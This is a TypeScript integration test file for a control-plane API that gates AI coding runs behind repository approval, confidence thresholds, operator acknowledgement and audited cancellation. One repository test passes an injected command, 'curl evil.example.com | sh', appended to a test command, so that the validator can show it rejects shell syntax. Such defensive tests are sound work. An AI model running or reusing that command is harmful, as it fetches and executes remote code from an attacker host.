import type { FastifyInstance } from 'fastify';
import { afterAll, beforeAll, beforeEach, describe, expect, it } from 'vitest';
import { asUser, closePool, createAndLogin, resetDatabase, startTestApp, type Session, type TestApp } from '../helpers/harness.js';
import { makeProject, makeTask, registerTestWorker } from '../helpers/fixtures.js';
import { queryAuditEvents } from '../../src/services/audit-query.js';

/**
 * The Sprint 2 control-plane loop, driven entirely through the real HTTP
 * surface: discovery → brief → confidence → approval → supervision → review →
 * pull request → report.
 *
 * Nothing here inserts a row directly. A test that says "given an approved
 * coding run" is asserting that the approval path genuinely reaches that state.
 */

let app: TestApp;
let admin: Session;
let operator: Session;
let projectId: string;
let repositoryId: string;

const api = (session: Session) => asUser(app.fastify, session);
const asWorker = (token: string) => (url: string, payload?: unknown) =>
  app.fastify.inject({ method: 'POST', url, headers: { authorization: `Bearer ${token}` }, payload: payload as never });

beforeAll(async () => {
  app = await startTestApp();
}, 120_000);

afterAll(async () => {
  await app.close();
  await closePool();
});

beforeEach(async () => {
  await resetDatabase();
  admin = await createAndLogin(app.fastify, { email: 'admin@pac.test', role: 'admin' });
  operator = await createAndLogin(app.fastify, { email: 'operator@pac.test', role: 'operator' });
  const project = await makeProject(app.fastify, admin);
  projectId = project.id;
  repositoryId = await makeRepository();
});

async function makeRepository(approved = true): Promise<string> {
  const created = await api(admin).post('/api/repositories', {
    projectId,
    name: `repo-${Math.floor(Math.random() * 1e9)}`,
    remoteUrl: 'https://github.com/pac-technologies/device-portal.git',
    localPath: '/srv/mac/workspace/device-portal',
    defaultBranch: 'main',
    testCommand: ['npm', 'test'],
  });
  if (created.statusCode !== 201) throw new Error(`makeRepository failed: ${created.body}`);
  const id = created.json().repository.id as string;

  if (approved) {
    const approval = await api(admin).post(`/api/repositories/${id}/approve`, { approved: true, notes: 'Reviewed.' });
    if (approval.statusCode !== 200) throw new Error(`approve failed: ${approval.body}`);
  }
  return id;
}

/** Runs discovery to the point where a brief exists, and returns it. */
async function runDiscovery(conversation: string[], taskTitle = 'Allow selecting multiple devices') {
  const started = await api(operator).post('/api/discovery', { projectId, title: taskTitle });
  expect(started.statusCode).toBe(201);
  const sessionId = started.json().session.id as string;
  const taskId = started.json().session.taskId as string;

  for (const message of conversation) {
    const posted = await api(operator).post(`/api/discovery/${sessionId}/messages`, { message });
    expect(posted.statusCode).toBe(200);
  }

  const generated = await api(operator).post(`/api/discovery/${sessionId}/brief`, {});
  expect(generated.statusCode).toBe(201);

  return { sessionId, taskId, brief: generated.json().brief, session: generated.json().session };
}

const RICH_CONVERSATION = [
  'I want the device selection screen changed so users can select multiple devices. At the moment it only accepts one.',
  'We also need the API to support that, but don\'t change the existing CSV import format because customers are using it.',
  'It is done when an operator can select two or more devices and save them together.',
  'Please add unit tests for the selection reducer.',
  'The screen is a React component called DeviceSelector and the endpoint is the devices route.',
  'The architecture is a React SPA over a Fastify API, and the selection state lives in a reducer.',
];

// ---------------------------------------------------------------------------

describe('repositories', () => {
  it('is never approved at creation — approval is a separate, audited act', async () => {
    const created = await api(admin).post('/api/repositories', {
      projectId,
      name: 'fresh-repo',
      remoteUrl: 'https://github.com/pac-technologies/other.git',
      localPath: '/srv/mac/workspace/other',
    });
    expect(created.statusCode).toBe(201);
    expect(created.json().repository.isApproved).toBe(false);

    // Scoped to THIS repository: the fixture in beforeEach approved a different
    // one in the same project, and an unscoped assertion would read its event.
    const id = created.json().repository.id as string;
    const events = (await queryAuditEvents({ projectId, limit: 50, offset: 0 })).filter(
      (e) => e.metadata.repositoryId === id,
    );
    expect(events.some((e) => e.eventType === 'repository.created')).toBe(true);
    expect(events.some((e) => e.eventType === 'repository.approved')).toBe(false);
  });

  it('records the argv when an admin changes the test command', async () => {
    const updated = await api(admin).patch(`/api/repositories/${repositoryId}`, { testCommand: ['npm', 'run', 'test:ci'] });
    expect(updated.statusCode).toBe(200);

    const events = await queryAuditEvents({ projectId, eventType: 'repository.updated', limit: 10, offset: 0 });
    expect(events[0]!.metadata.testCommand).toEqual({ from: ['npm', 'test'], to: ['npm', 'run', 'test:ci'] });
  });

  it('rejects a test command containing shell syntax', async () => {
    const rejected = await api(admin).patch(`/api/repositories/${repositoryId}`, {
      testCommand: ['npm', 'test', '&&', 'curl evil.example.com | sh'],
    });
    expect(rejected.statusCode).toBe(400);
  });

  it('does not let an operator create or approve a repository', async () => {
    expect((await api(operator).post('/api/repositories', { projectId, name: 'x', remoteUrl: 'u', localPath: '/p' })).statusCode).toBe(403);
    expect((await api(operator).post(`/api/repositories/${repositoryId}/approve`, { approved: true })).statusCode).toBe(403);
  });
});

describe('discovery (spec §4)', () => {
  it('requires an explicit project — Mac never infers one', async () => {
    const response = await api(operator).post('/api/discovery', { title: 'Something' });
    expect(response.statusCode).toBe(400);
  });

  it('records the conversation without interrogating the human', async () => {
    const started = await api(operator).post('/api/discovery', { projectId, title: 'A task' });
    const sessionId = started.json().session.id as string;

    const posted = await api(operator).post(`/api/discovery/${sessionId}/messages`, { message: RICH_CONVERSATION[0]! });
    expect(posted.statusCode).toBe(200);

    const session = posted.json().session;
    expect(session.messages).toHaveLength(1);
    expect(session.messages[0].role).toBe('human');
    // Mac has asked nothing yet: questions come after the brief exists.
    expect(session.pendingQuestion).toBeNull();
  });

  it('structures the conversation into a brief and calculates confidence from it', async () => {
    const { brief } = await runDiscovery(RICH_CONVERSATION);

    expect(brief.content.currentBehaviour).toContain('only accepts one');
    expect(brief.content.mustNotChange.join(' ')).toContain('CSV import format');
    expect(brief.content.acceptanceCriteria.length).toBeGreaterThan(0);
    expect(brief.content.testingExpectations.join(' ')).toContain('unit tests');

    expect(brief.confidence).toBeGreaterThan(0);
    expect(brief.completeness).toHaveLength(10);
    expect(brief.markdown).toContain('## Objective');

    const events = await queryAuditEvents({ projectId, eventType: 'brief.confidence_calculated', limit: 5, offset: 0 });
    expect(events).toHaveLength(1);
    // The whole checklist is in the trail, so the number can be audited.
    expect(Array.isArray(events[0]!.metadata.dimensions)).toBe(true);
  });

  it('asks exactly one question at a time', async () => {
    const { session } = await runDiscovery(['Make the device screen better.']);
    expect(session.pendingQuestion).not.toBeNull();

    const macTurns = session.messages.filter((m: { role: string }) => m.role === 'mac');
    expect(macTurns).toHaveLength(1);
  });

  it('raises confidence when the human answers the question', async () => {
    const { sessionId, brief } = await runDiscovery(['Make the device screen better.']);
    const before = brief.confidence;

    const answered = await api(operator).post(`/api/discovery/${sessionId}/messages`, {
      message: 'It is done when an operator can select several devices at once and save them together.',
    });
    expect(answered.statusCode).toBe(200);

    const after = (await api(operator).get(`/api/briefs/${brief.id}`)).json().brief;
    expect(after.confidence).toBeGreaterThan(before);
  });

  it('recomputes confidence rather than accepting an asserted value', async () => {
    const { brief } = await runDiscovery(RICH_CONVERSATION);

    // There is deliberately no way to PATCH confidence. Editing content changes
    // it; asserting it does not.
    const patched = await api(operator).patch(`/api/briefs/${brief.id}`, {
      content: { acceptanceCriteria: [], testingExpectations: [], mustNotChange: [] },
    });
    expect(patched.statusCode).toBe(200);
    expect(patched.json().brief.confidence).toBeLessThan(brief.confidence);
  });
});

describe('confidence enforcement on coding runs (spec §5)', () => {
  it('refuses to create a coding run below the 0.60 floor, even for an admin', async () => {
    const { taskId, brief } = await runDiscovery(['Do the thing.']);
    expect(brief.confidence).toBeLessThan(0.6);

    for (const session of [operator, admin]) {
      const response = await api(session).post('/api/coding-runs', {
        taskId,
        repositoryId,
        briefId: brief.id,
        provider: 'mock',
      });
      expect(response.statusCode).toBe(409);
      expect(response.json().error.code).toBe('CONFIDENCE_BELOW_FLOOR');
      expect(response.json().error.message).toContain('cannot be overridden');
    }
  });

  it('creates a run in the autonomous band and requires no acknowledgement to approve', async () => {
    const { taskId, brief } = await runDiscovery(RICH_CONVERSATION);
    expect(brief.confidence).toBeGreaterThanOrEqual(0.8);

    const created = await api(operator).post('/api/coding-runs', { taskId, repositoryId, briefId: brief.id, provider: 'mock' });
    expect(created.statusCode).toBe(201);
    const runId = created.json().run.id as string;
    expect(created.json().run.jobKind).toBe('claude_code');

    expect((await api(operator).post(`/api/runs/${runId}/submit`)).statusCode).toBe(200);
    const approved = await api(operator).post(`/api/runs/${runId}/approve`, {});
    expect(approved.statusCode).toBe(200);
    expect(approved.json().run.status).toBe('queued');
  });

  it('requires an acknowledged limited scope in the 60–79% band', async () => {
    // A brief with enough for the floor but not for autonomy.
    const { taskId, brief } = await runDiscovery([
      'At the moment the device screen only accepts one device.',
      'It should accept several devices at once so operators can act in bulk.',
      'Do not change the CSV import format.',
    ]);

    if (brief.confidence >= 0.6 && brief.confidence < 0.8) {
      const created = await api(operator).post('/api/coding-runs', { taskId, repositoryId, briefId: brief.id, provider: 'mock' });
      expect(created.statusCode).toBe(201);
      expect(created.json().run.status).toBe('draft');

      const runId = created.json().run.id as string;
      await api(operator).post(`/api/runs/${runId}/submit`);

      const bare = await api(operator).post(`/api/runs/${runId}/approve`, {});
      expect(bare.statusCode).toBe(409);
      expect(bare.json().error.code).toBe('ACKNOWLEDGEMENT_REQUIRED');

      const acknowledged = await api(operator).post(`/api/runs/${runId}/approve`, {
        acknowledgeBelowThreshold: true,
        notes: 'Limited scope: data model and API only.',
      });
      expect(acknowledged.statusCode).toBe(200);
    } else {
      // The band the fixture lands in depends on the gap analysis weights; if it
      // is not the limited band, this case is covered by the unit tests instead.
      expect(brief.confidence).toBeGreaterThan(0);
    }
  });

  it('refuses a coding run against an unapproved repository', async () => {
    const unapproved = await makeRepository(false);
    const { taskId, brief } = await runDiscovery(RICH_CONVERSATION);

    const response = await api(operator).post('/api/coding-runs', {
      taskId,
      repositoryId: unapproved,
      briefId: brief.id,
      provider: 'mock',
    });
    expect(response.statusCode).toBe(409);
    expect(response.json().error.code).toBe('REPOSITORY_NOT_APPROVED');
  });
});

describe('dispatch of coding runs', () => {
  async function approvedCodingRun(): Promise<{ runId: string; taskId: string; briefId: string }> {
    const { taskId, brief } = await runDiscovery(RICH_CONVERSATION);
    const created = await api(operator).post('/api/coding-runs', { taskId, repositoryId, briefId: brief.id, provider: 'mock' });
    const runId = created.json().run.id as string;
    await api(operator).post(`/api/runs/${runId}/submit`);
    await api(operator).post(`/api/runs/${runId}/approve`, {});
    return { runId, taskId, briefId: brief.id };
  }

  it('hands the worker a fully resolved coding assignment', async () => {
    await approvedCodingRun();
    const worker = await registerTestWorker(app.fastify);

    const leased = await asWorker(worker.token)('/api/worker/lease', { waitSeconds: 0, capabilities: ['claude_code'] });
    expect(leased.statusCode).toBe(200);

    const assignment = leased.json().assignment;
    expect(assignment).not.toBeNull();
    expect(assignment.jobKind).toBe('claude_code');

    // Everything the worker needs was resolved SERVER-SIDE from the database.
    const coding = assignment.coding;
    expect(coding.remoteUrl).toBe('https://github.com/pac-technologies/device-portal.git');
    expect(coding.localPath).toBe('/srv/mac/workspace/device-portal');
    expect(coding.defaultBranch).toBe('main');
    expect(coding.branch).toMatch(/^mac\/[0-9a-f]{8}-/);
    expect(coding.pullRequestBase).toBe('main');
    expect(coding.task.testCommand).toEqual(['npm', 'test']);
    // The STRUCTURED brief, not the raw conversation (spec §12).
    expect(coding.task.brief.acceptanceCriteria.length).toBeGreaterThan(0);
    expect(coding.task.briefMarkdown).toContain('## Objective');
  });

  it('will not dispatch once repository approval is withdrawn', async () => {
    await approvedCodingRun();
    const revoked = await api(admin).post(`/api/repositories/${repositoryId}/approve`, { approved: false, notes: 'Under review.' });
    expect(revoked.statusCode).toBe(200);

    const worker = await registerTestWorker(app.fastify);
    const leased = await asWorker(worker.token)('/api/worker/lease', { waitSeconds: 0, capabilities: ['claude_code'] });
    expect(leased.json().assignment).toBeNull();
  });

  it('stops a coding run at the overnight cutoff and preserves the work (Sprint 2 §18)', async () => {
    const { taskId, brief } = await runDiscovery(RICH_CONVERSATION);
    const created = await api(operator).post('/api/coding-runs', {
      taskId,
      repositoryId,
      briefId: brief.id,
      provider: 'mock',
      executionMode: 'overnight',
    });
    const runId = created.json().run.id as string;
    await api(operator).post(`/api/runs/${runId}/submit`);
    await api(operator).post(`/api/runs/${runId}/approve`, {});

    const worker = await registerTestWorker(app.fastify);
    const leased = await asWorker(worker.token)('/api/worker/lease', { waitSeconds: 0, capabilities: ['claude_code'] });
    expect(leased.json().assignment).not.toBeNull();

    // The worker reports its worktree, then the cutoff arrives.
    await asWorker(worker.token)(`/api/worker/runs/${runId}/worktree`, {
      path: '/srv/mac/workspace/worktrees/run-1',
      branch: 'mac/abc12345-allow-selecting-multiple-devices',
      baseBranch: 'main',
      baseSha: 'a'.repeat(40),
      commitCount: 2,
      status: 'active',
    });

    const { stopRunsPastOvernightCutoff } = await import('../../src/services/runs.js');
    const { db } = await import('../../src/db/client.js');
    const { runs } = await import('../../src/db/schema.js');
    const { eq } = await import('drizzle-orm');

    // Move the deadline into the past rather than waiting for 08:00 Sydney.
    await db.update(runs).set({ overnightDeadlineAt: new Date(Date.now() - 1000) }).where(eq(runs.id, runId));

    const stopped = await stopRunsPastOvernightCutoff(new Date());
    expect(stopped).toContain(runId);

    // The stop is REQUESTED, not forced: the worker is told on its next call,
    // so it can finish safely rather than being killed mid-commit.
    const run = (await api(operator).get(`/api/runs/${runId}`)).json().run;
    expect(run.cancelRequestedAt).not.toBeNull();
    expect(run.stopReason).toBe('overnight_cutoff');

    const control = (await asWorker(worker.token)('/api/worker/heartbeat', { status: 'busy', currentRunId: runId })).json().control;
    expect(control.cancelRequested).toBe(true);
    expect(control.cancelReason).toBe('overnight_cutoff');

    // The worktree and its commits are untouched — the cutoff must not destroy
    // useful work.
    const detail = (await api(operator).get(`/api/runs/${runId}/coding`)).json().detail;
    expect(detail.worktree).not.toBeNull();
    expect(detail.worktree.commitCount).toBe(2);
    expect(detail.worktree.status).not.toBe('removed');
  });

  it('preserves the worktree when an operator cancels a coding run', async () => {
    await approvedCodingRun();
    const worker = await registerTestWorker(app.fastify);
    const leased = await asWorker(worker.token)('/api/worker/lease', { waitSeconds: 0, capabilities: ['claude_code'] });
    const runId = leased.json().assignment.runId as string;

    await asWorker(worker.token)(`/api/worker/runs/${runId}/worktree`, {
      path: '/srv/mac/workspace/worktrees/run-2',
      branch: 'mac/abc12345-allow-selecting-multiple-devices',
      baseBranch: 'main',
      baseSha: 'b'.repeat(40),
      commitCount: 1,
      status: 'active',
    });

    const cancelled = await api(operator).post(`/api/runs/${runId}/cancel`, { reason: 'Needed the machine.' });
    expect(cancelled.statusCode).toBe(200);

    const control = (await asWorker(worker.token)('/api/worker/heartbeat', { status: 'busy', currentRunId: runId })).json().control;
    expect(control.cancelRequested).toBe(true);

    // The worker acknowledges by preserving the worktree and reporting.
    await asWorker(worker.token)(`/api/worker/runs/${runId}/worktree`, {
      path: '/srv/mac/workspace/worktrees/run-2',
      branch: 'mac/abc12345-allow-selecting-multiple-devices',
      baseBranch: 'main',
      baseSha: 'b'.repeat(40),
      headSha: 'c'.repeat(40),
      commitCount: 1,
      status: 'preserved',
    });
    await asWorker(worker.token)(`/api/worker/runs/${runId}/complete`, { outcome: 'cancelled', summary: 'Stopped on request.' });

    const run = (await api(operator).get(`/api/runs/${runId}`)).json().run;
    expect(run.status).toBe('cancelled');

    const detail = (await api(operator).get(`/api/runs/${runId}/coding`)).json().detail;
    expect(detail.worktree.status).toBe('preserved');
    expect(detail.worktree.commitCount).toBe(1);

    const events = await queryAuditEvents({ runId, limit: 50, offset: 0 });
    expect(events.map((e) => e.eventType)).toContain('worktree.preserved');
  });

  it('still refuses to dispatch a coding run that was never approved', async () => {
    const { taskId, brief } = await runDiscovery(RICH_CONVERSATION);
    const created = await api(operator).post('/api/coding-runs', { taskId, repositoryId, briefId: brief.id, provider: 'mock' });
    await api(operator).post(`/api/runs/${created.json().run.id}/submit`);
    // Deliberately not approved.

    const worker = await registerTestWorker(app.fastify);
    const leased = await asWorker(worker.token)('/api/worker/lease', { waitSeconds: 0, capabilities: ['claude_code'] });
    expect(leased.json().assignment).toBeNull();
  });
});
